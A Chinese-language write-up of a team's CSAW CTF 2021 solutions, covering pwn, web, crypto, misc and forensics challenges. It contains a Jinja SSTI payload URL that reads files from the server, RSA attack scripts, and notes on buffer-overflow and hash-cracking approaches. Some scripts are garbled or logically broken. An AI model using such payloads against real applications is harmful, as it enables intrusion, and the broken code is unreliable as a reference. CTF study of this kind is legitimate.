# CSAW CTF 2021
## COMPASS-HED(HappyEveryDday)
Rank #90 over total 1216  
中国地区排名第一

比赛结束服务器立刻down了，所以部分题目只有完整思路没有exp  
### pwn
#### Alien Math 60pts
第一问，要回答rand()的值，因为没有设置种子，所以本地编译一个c文件看看rand()的第一个值是多少即可  
第二问是一个简单的逆向，根据程序的算法逐位爆破出输入
```python
def go(a1, s1) :
    a1 = list(str(a1))
    s1 = str(s1)
    for i in range(0, len(a1) - 1) :
        a1[i + 1] = chr((ord(a1[i + 1]) - 48 + g(ord(a1[i]), (i + ord(a1[i])))) % 10 + 48)
        r = ""
        for i in a1 :
r += i
if r[:len(s1)] == s1 :
    return True
else :
    return False

s = "7759406485255323229225"
index = 1
m = 0
for i in range(len(s)) :
    for j in range(10) :
        if go(m + j, int(s[:index])) :
            m = (m + j) * 10
            index = index + 1
            print(m)
            break
```
题目答对两题之后会有gets()的机会，题目没有canary，没有PIE，直接return to print_flag

#### haySTACK 290pts
题目需要猜测一个0-40000000的随机数，但是随机数的种子是整数的时间，所以本地编译一个同样逻辑的c程序，pwn时候读出链接服务器的时间戳（秒）做种子的随机数即可
### web
#### ninja 50pts
参数注入的几种尝试后发现是SSTI，但是有WAF过滤了很多字符  
构造出读出列表的os payload  
http://web.chal.csaw.io:5000/submit?value=
{{request[request.args.param1].mro()[-1][request.args.param2]()}}&param1=\_\_class\_\_&param2=\_\_subclasses\_\_  
修改后直接读flag:  
http://web.chal.csaw.io:5000/submit?value={{request[request.args.param1].mro()[-1][request.args.param2]().pop(40)(%27flag.txt%27).read()}}&param1=\_\_class\_\_&param2=\_\_subclasses\_\_
### crypto
#### Gotta Decrypt Them All 175pts
nc过去发现是摩尔斯码得到数字，斜杠分割转ascii做base64解码最后rot13得到正文，但是需要自动解若干组。  
```python
from pwn import *
import codecs


def rot13(s):
    chars = "abcdefghijklmnopqrstuvwxyz"
    trans = chars[13:] + chars[:13]
    rot_char = lambda c: trans[chars.find(c)] if chars.find(c) > -1 else c
    return ''.join(rot_char(c) for c in s)


p = remote("crypto.chal.csaw.io", 5001)
d = {'.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E', '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I',
     '.---': 'J', '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O', '.--.': 'P', '--.-': 'Q', '.-.': 'R',
     '...': 'S', '-': 'T', '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y', '--..': 'Z', '.----': '1',
     '..---': '2', '...--': '3', '....-': '4', '.....': '5', '-....': '6', '--...': '7', '---..': '8', '----.': '9',
     '-----': '0', '--..--': ', ', '.-.-.-': '.', '..--..': '?', '-..-.': '/', '-....-': '-', '-.--.': '(',
     '-.--.-': ')'}
context.log_level='debug'
while True:
    p.recvuntil(b"What does this mean?\r\n")
    s = p.recvline().strip().decode().split("/")
    inf = ""
    for i in s:
        if len(i) != 0:
            data = i.split(" ")
            r = ""
            for j in data:
                if len(j) != 0:
                    r += d[j]
            inf += chr(int(r))

    inf = base64.b64decode(inf).decode().split("c = ")[1]
    print(inf)
    inf = int(gmpy2.iroot(int(inf), 3)[0])
    print(inf)
    inf = bytes.fromhex(hex(inf)[2:]).decode()
    print(inf)
    inf = codecs.encode(inf, 'rot_13')
    print(inf)
    p.sendlineafter(b">>", inf.encode())
```
执行脚本得到flag
#### RSA Pop Quiz 390pts
第一问给出RSA的n，e，c，问正文，其中e几乎和n一样大  
e过小(<3)或者过大时可以通过winner hack解出正文，脚本：
```python
def rational_to_contfrac(x, y):
    a = x // y
    pquotients = [a]
    while a * y != x:
        x, y = y, x - a * y
        a = x // y
        pquotients.append(a)
    return pquotients


def convergents_from_contfrac(frac):
    convs = [];
    for i in range(len(frac)):
        convs.append(contfrac_to_rational(frac[0:i]))
    return convs


def contfrac_to_rational(frac):
    if len(frac) == 0:
        return (0, 1)
    num = frac[-1]
    denom = 1
    for _ in range(-2, -len(frac) - 1, -1):
        num, denom = frac[_] * num + denom, num
    return (num, denom)


def wiener_hack(e, n, c):
    frac = rational_to_contfrac(e, n)
    convergents = convergents_from_contfrac(frac)
    for (k, d) in convergents:
        if k != 0 and (e * d - 1) % k == 0:
            phi = (e * d - 1) // k
            s = n - phi + 1
            discr = s * s - 4 * n
            if (discr >= 0):
                try:
                    r = bytes.fromhex(str(hex(pow(c, d, n)))[2:])
                except:
                    r = bytes.fromhex("0" + str(hex(pow(c, d, n)))[2:])
                if b'flag' or b'w' in r:
                    print(r)
    return False


e = 
n = 
c = 
d = wiener_hack(e, n, c)
```
第二问  
第三问  
第四问题目告知了n，e=17，c和d的低512位d0，通过Coppersmith attack解出完整的d。  
sage（一个强力的数学运算语言，使用自带的python解释器）脚本：
```python
# sage
def getFullP(low_p, n):
	R.<x> = PolynomialRing(Zmod(n), implementation='NTL')
	p = x*2^512 + low_p
	root = (p-n).monic().small_roots(X = 2^128, beta = 0.4)
	if root:
		return p(root[0])
	return None


def phase4(low_d, n, c, e):
	maybe_p = []
	for k in range(1, e+1):
		p = var('p')
		p0 = solve_mod([e*p*low_d  == p + k*(n*p - p^2 - n + p)], 2^512)
		maybe_p += [int(x[0]) for x in p0]
	for x in maybe_p:
		P = getFullP(x, n)
		if P: 
			P = int(P)
			Q = n // P
			assert P*Q == n
			d = inverse_mod(e, (P-1)*(Q-1))
			print(bytes.from(hex(power_mod(c, d, n))[2:]))
			break
	


n = 
e = 
c = 
low_d =
phase4(low_d, n, c, e)
```
完成四个问题后得到flag
#### Forgery 405pts

### ics
#### The Magic Modbus 50pts

#### A Pain in the BAC(net) 50pts
只有8种可能，爆破 flag{Sensor_12345}  
### misc
#### welcome 1pts
签到
#### Survey Says 10pts  
问卷
#### Weak Password 50pts
已知hash，姓名加YYYYMMDD爆破，或者直接去神奇的cmd5求解  
#### Save the Tristate 474pts
神奇的量子计算题，难点是要知道这是量子通信，然后是BB84协议里的测量方法。  
首先需要逐位测量256个量子比特+或x，然后接收256个量子基底。  
最后返回观测结果，根据BB84协议写出脚本：
```python
from pwn import *

p = remote("misc.chal.csaw.io", 5001)


def check(s):
    p.recvuntil(b" check?")
    p.sendline(str(len(s)).encode())
    p.recvuntil(b"bases: ")
    p.sendline(s.encode())
    p.recvuntil(b"Errors: ")
    return int(p.recvline().decode().strip())


r = ""
for i in range(0, 256):
    r += "+"
    n = check(r)
    if n != 0:
        r = r[:len(r) - 1] + "x"
        if i == 255:
            check(r)
    print(r)

s = p.recvuntil(b"What is the key?: ").decode().strip().split("\n")[:-1]
k = ""
for i in range(0, len(s)):
    if len(s[i]) > 3:
        basis = r[i]
        qubit = s[i].strip()
        if (qubit == '0.0 + 1.0i' and basis == '+') or (
                qubit == '-0.707 + 0.707i' and basis == 'x'):
            k += "1"
        else:
            k += "0"
print(k)
p.interactive()
```
输入最后二进制转为ASCII的得到flag
### forensics
#### Lazy Leaks 50pts

#### Connact Us 175pts

#### mic 331pts
得到一个pdf，放大会发现有很多小黄点，根据谷歌和题目名字考虑是MIC(https://en.wikipedia.org/wiki/Machine_Identification_Code),首先将pdf转换为高清图片：
>pdftoppm scan.pdf X -png

然后通过deda识别MIF
>deda_parse_print X-1.png  
>deda_parse_print X-2.png  
>...

将机器编码转换成ASCII，得到flag
#### Sonicgraphy Fallout 363pts

### warm-up
#### Turing 25pts
cyberChief的恩戈马尼机和这道题目的内容好像对不上，谷歌题目内容“M3 UKW B enigma online”第一条的模拟器全默认值就可以解出  
P.S : cyberchief上的enigma只是第三代版本,enigma还有前两代和后一代，前一代就是UKW
#### Crack Me 25pts
已知哈希值，请万能的cmd5解出flag
#### poem-collection 25pts
题目环境down了，好像是简单的任意路径访问
#### Password Checker 25pts
简单gets() BOF，无canary，无PIE，有后门函数
#### checker 25pts
根据题目python脚本逆向每一步，基本就是再反着再加密一遍就能得到flag